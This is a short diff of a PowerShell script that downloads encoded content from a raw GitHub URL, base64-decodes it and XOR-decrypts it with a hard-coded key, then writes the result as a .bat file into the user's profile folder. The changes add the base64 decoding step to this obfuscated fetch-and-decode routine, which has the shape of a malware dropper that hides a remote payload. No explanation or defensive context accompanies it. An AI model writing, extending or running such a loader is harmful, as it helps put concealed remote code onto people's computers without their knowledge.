@@ -2,8 +2,13 @@ $u='https://raw.githubusercontent.com/Jakeryan500/a/refs/heads/main/skibidi'
 $k='moon'
 $p="$env:USERPROFILE\output.bat"
 
-$d=(iwr $u -UseBasicParsing).Content
-$o=-join([char[]]([char[]]$d|%{$i=0}{[byte][char]$_ -bxor [byte][char]$k[$i++%$k.Length]}))
+$d = (iwr $u -UseBasicParsing).Content.Trim()
+$b = [Convert]::FromBase64String($d)
+
+$o = -join([char[]]($b | % {$i=0} {
+    $_ -bxor [byte][char]$k[$i++ % $k.Length]
+}))
+
 
 $o | Out-File $p
 
